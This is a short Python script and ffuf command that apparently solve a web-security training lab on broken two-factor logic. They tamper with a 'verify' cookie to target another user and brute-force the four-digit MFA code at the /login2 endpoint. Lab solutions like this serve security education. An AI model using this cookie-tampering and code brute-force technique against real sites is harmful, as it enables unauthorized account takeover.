#2FA broken logic
#To bypass 2FA 
#Solution: We will bruteforce for the same valid cookie credentials but with another username we wanna login.
#We can try any number of 4 digit code without a/c being compromised

import requests
url = "https://0ae800f0047a4320c1b44123009f0037.web-security-academy.net/login2"

for i in range(0,10000):
    cookie={
        "session":"n3RSGUUjBINW3tVHVw44wYZnAaKpVkhK",
        "verify":"carlos"
    }
    data={
        "mfa-code":"0584" # This mfa-code has been bruteforced using ffuf cmd and given at last
    }
    r = requests.post(url,cookies=cookie,data=data)
    if "Incorrect security code" not in r.text:
        print(r.text)


#FFUF Command for bruteforcing the mfa-code
#ffuf -u IP/login2 -H "Cookie: verify=carlos; session=n3RSGUUjBINW3tVHVw44wYZnAaKpVkhK" -d mfa-code=FUZZ -w code.txt:FUZZ -fr "Incorrect security code" -X POST

#login2 is vital here. It is the request page where you enter mfa-code. It is obtained from valid credentials of wiener
